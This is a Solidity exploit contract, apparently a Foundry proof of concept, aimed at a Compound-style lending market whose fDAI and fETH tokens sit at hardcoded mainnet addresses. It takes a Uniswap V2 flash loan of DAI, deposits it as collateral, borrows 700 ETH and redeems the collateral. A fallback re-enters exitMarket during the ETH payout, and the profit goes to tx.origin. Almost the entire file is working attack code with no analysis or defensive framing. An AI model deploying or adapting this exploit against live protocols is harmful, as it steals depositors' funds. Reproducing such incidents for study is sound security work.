// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";

library SwapUtils {
     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn * amountOut * 1000;
        uint denominator = (reserveOut - amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = reserveIn * 1000 + amountInWithFee;
        amountOut = numerator / denominator;
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function approve(address spender, uint256 amount) external;
    function deposit(uint256 amount) payable external;
}

interface IComptroller {
    function enterMarkets(address[] memory cTokens) external returns (uint[] memory);
    function exitMarket(address cTokenAddress) external returns (uint);
}

interface ICERC20 {
    function balanceOf(address owner) virtual external returns (uint);
    function mint(uint mintAmount) virtual external returns (uint);
    function redeem(uint redeemTokens) virtual external returns (uint);
    function redeemUnderlying(uint redeemAmount) virtual external returns (uint);
    function borrow(uint borrowAmount) virtual external returns (uint);
    function repayBorrow(uint repayAmount) virtual external returns (uint);
    function repayBorrowBehalf(address borrower, uint repayAmount) virtual external returns (uint);
}

interface IUniswapV2Pair {
    function swap(
        uint256,
        uint256,
        address,
        bytes calldata
    ) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract Exploit {

    event SMTM(address receiver, uint amount);

    IERC20 DAI;
    ICERC20 fDAI;
    ICERC20 fETH;
    IERC20 wETH;
    IComptroller comptroller;
    IUniswapV2Pair uDAI_USDC;
    IUniswapV2Pair uDAI_wETH;
    constructor() {
        DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        fDAI = ICERC20(0x7e9cE3CAa9910cc048590801e64174957Ed41d43);
        fETH = ICERC20(0xbB025D470162CC5eA24daF7d4566064EE7f5F111);
        uDAI_USDC = IUniswapV2Pair(0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5); // DAI-USDC
        uDAI_wETH = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11); // DAI-WETH
        wETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        comptroller = IComptroller(0xc54172e34046c1653d1920d40333Dd358c7a1aF4);
    }

    function uniswapV2Call(address sender, uint amount0Out, uint amount1Out, bytes calldata data) external {
        if (data[0] == 0) {
            uint origDaiBalance = DAI.balanceOf(address(this));
            DAI.approve(address(fDAI), DAI.balanceOf(address(this)));
            fDAI.mint(DAI.balanceOf(address(this)));
            address[] memory markets = new address[](1);
            markets[0] = address(fDAI);
            uint[] memory results = comptroller.enterMarkets(markets);
            fETH.borrow(700 ether);
            fDAI.redeemUnderlying(origDaiBalance);

            // now, we have 700 ETH and 1000000 DAI
            // to pay back to uniswap, we need to buy some more DAI
            uint daiAmount = origDaiBalance * 10031/10000 - DAI.balanceOf(address(this));
            uint112 reserveIn;
            uint112 reserveOut;
            (reserveOut, reserveIn, ) = uDAI_wETH.getReserves();
            uint ethAmount = SwapUtils.getAmountIn(daiAmount, reserveIn, reserveOut);
            wETH.deposit{value: ethAmount}(ethAmount);
            wETH.transfer(address(uDAI_wETH), ethAmount);
            uDAI_wETH.swap(daiAmount, 0, address(this), "");
            DAI.transfer(address(uDAI_USDC), DAI.balanceOf(address(this)));
        }
        else {
            revert("wtf?");
        }  
    }

    function fire() public {
        for (uint i = 0; i < 1; i++) {
            uDAI_USDC.swap(4000000 * 1e18, 0, address(this), hex"00");
        }

        uint amount = address(this).balance;
        payable(tx.origin).transfer(amount);
        emit SMTM(tx.origin, amount);

    }

    fallback() external payable {
        comptroller.exitMarket(address(fDAI));
    }
}
